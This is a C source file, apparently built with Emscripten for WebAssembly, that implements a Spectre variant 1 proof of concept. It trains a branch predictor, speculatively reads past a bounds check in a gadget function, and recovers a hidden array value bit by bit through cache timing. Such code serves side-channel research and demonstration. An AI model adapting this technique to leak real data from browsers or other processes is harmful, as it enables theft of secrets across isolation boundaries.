#include <stdio.h>
#include <stdlib.h>
#include <emscripten.h>
#include <emscripten/wasm_worker.h>

#define CACHE_FLUSH_ITERATIONS 4096
#define CACHE_FLUSH_STRIDE 4096
#define NLOOPS 500
int array1[16] = {0, 1, 2, 3, 4, 5};
char space1[CACHE_FLUSH_STRIDE];
//char array2[2 * CACHE_FLUSH_STRIDE * NLOOPS];
char *array2;
char space2[CACHE_FLUSH_STRIDE];
char junk_space[2 * CACHE_FLUSH_STRIDE];
int offset = 0;

void gadget(int x, int bit, char *addr){
    int y;
    char junk;
    y = ((array1[x] >> bit) & 1);
    if (x < 5){
        junk = addr[y * CACHE_FLUSH_STRIDE];
    }
}
/*
void storecache(int caching){
    int j, junk;
    for (j = 0;j < NLOOPS;j++){

        junk = array2[caching * CACHE_FLUSH_STRIDE * NLOOPS + 1*CACHE_FLUSH_STRIDE*j];
    }
}
*/

void training(int index, int bit){
    for(int k = 0;k < NLOOPS;k++){
        for(int j = 0;j < 6;j++){
            for(int i = 0;i < 5;i++){
                //mix_i = (((int)tmp++ * 167) + 13) & 255;
                gadget(i, 0, junk_space);
            }
            gadget(index, bit, array2 + 2*CACHE_FLUSH_STRIDE*k);
        }
    }
}


void spectre(int index){
    int i, j, k, l, junk, mix_i, min, bit;
    char *addr;
    double start, end;
    double result[2] = {0};
    int answer = 0;

    //emscripten_sleep(100);
    array2 = (char*)calloc(1, 2 * CACHE_FLUSH_STRIDE * NLOOPS);
    bit = 0;
    for (k = 0;k < 8;k++){
        emscripten_run_script("clflush()");
        emscripten_run_script("triggerGC()");
        for(l = 0;l < 5;l++){
            for(i = 0;i < 2;i++){
                //mix_i = ((i * 167) + 13) & 255;
                mix_i = i;
                //storecache(caching);
                training(index, bit);
                addr = &array2[mix_i*CACHE_FLUSH_STRIDE];
                //time to measurement
                start = emscripten_performance_now();
                for (j = 0;j < NLOOPS;j++){
                    junk = *(addr + 2*CACHE_FLUSH_STRIDE*j);
                }
                end = emscripten_performance_now();
                result[mix_i] += end - start;
            }
        }
        puts("Show results.");
        min = 0;
        for(i = 0;i < 2;i++){
            printf("index %d: %f.\n", i, result[i]);
            if (result[min] > result[i])min = i;
        }
        puts("");
        printf("minimal index: %d.\n", min);
        answer += min << k;

        bit++;
    }
    printf("Answer: %d.\n", answer);
}

int main(void){
    char junk;
    for(int i = 0;i < NLOOPS;i++){
        junk = array2[2*CACHE_FLUSH_STRIDE*i];
        junk = array2[2*CACHE_FLUSH_STRIDE*i + CACHE_FLUSH_STRIDE];
    }
    spectre(5);
    return 0;
}
